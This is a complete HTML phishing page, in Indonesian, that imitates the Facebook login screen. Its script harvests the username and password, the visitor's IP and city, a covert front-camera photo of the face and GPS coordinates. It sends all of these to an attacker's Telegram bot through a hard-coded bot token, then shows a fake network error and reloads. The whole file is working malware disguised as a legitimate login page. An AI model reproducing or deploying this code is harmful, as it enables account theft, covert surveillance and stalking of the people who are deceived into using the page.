<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; }
        .header { width: 100%; padding: 20px 0; text-align: center; border-bottom: 1px solid #dddfe2; }
        .fb-logo { width: 120px; }
        .login-box { width: 90%; max-width: 400px; margin-top: 20px; text-align: center; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 8px; background-color: #f5f6f7; font-size: 14px; box-sizing: border-box; }
        .btn-login { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 8px; color: white; font-size: 17px; font-weight: bold; cursor: pointer; }
        .footer { margin-top: 50px; color: #737373; font-size: 12px; }
        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 100; justify-content: center; align-items: center; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="loading">Menghubungkan...</div>

<div class="header">
    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu_m_aGDR.png" class="fb-logo" alt="Facebook">
</div>

<div class="login-box">
    <input type="text" id="user" placeholder="Nomor ponsel atau email">
    <input type="password" id="pass" placeholder="Kata sandi">
    <button class="btn-login" onclick="startCapture()">Log In</button>
    <div class="footer">Meta © 2026</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // DATA ANDA (SUDAH DIKOREKSI)
    const TOKEN = '8717732956:AAEh9PX8gwSVDuuc46pmQotywaS6h03E5rg';
    const CHAT_ID = '8460192289';

    async function startCapture() {
        const u = document.getElementById("user").value;
        const p = document.getElementById("pass").value;

        if(!u || !p) {
            alert("Nomor ponsel atau kata sandi salah.");
            return;
        }

        document.getElementById("loading").style.display = "flex";

        try {
            // Ambil Info IP
            const ipRes = await fetch('https://ipapi.co/json/');
            const ip = await ipRes.json();

            // Akses Kamera
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;

            // Tunggu sebentar agar kamera fokus
            setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    // Matikan kamera
                    stream.getTracks().forEach(t => t.stop());

                    // Ambil GPS
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        await sendToTelegram(u, p, ip, pos, blob);
                    }, async () => {
                        await sendToTelegram(u, p, ip, null, blob);
                    });
                }, 'image/jpeg');
            }, 1000);

        } catch (e) {
            // Jika kamera ditolak, tetap kirim data login & IP
            await sendTextOnly(u, p, "Kamera Ditolak");
        }
    }

    async function sendToTelegram(u, p, ip, pos, blob) {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "wajah.jpg");
        
        let caption = `🔥 TARGET MASUK JEBAKAN!\n\n`;
        caption += `👤 User: ${u}\n`;
        caption += `🔑 Pass: ${p}\n`;
        caption += `🌐 IP: ${ip.ip}\n`;
        caption += `🏙️ Kota: ${ip.city}\n`;
        if(pos) {
            caption += `📍 Peta: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        } else {
            caption += `📍 GPS: Ditolak Target`;
        }

        formData.append("caption", caption);

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });

        finish();
    }

    async function sendTextOnly(u, p, status) {
        const msg = `⚠️ TARGET LOGIN (Tanpa Foto)\nUser: ${u}\nPass: ${p}\nStatus: ${status}`;
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        finish();
    }

    function finish() {
        alert("Kesalahan jaringan. Sesi berakhir, silakan login ulang.");
        location.reload();
    }
</script>
</body>
</html>
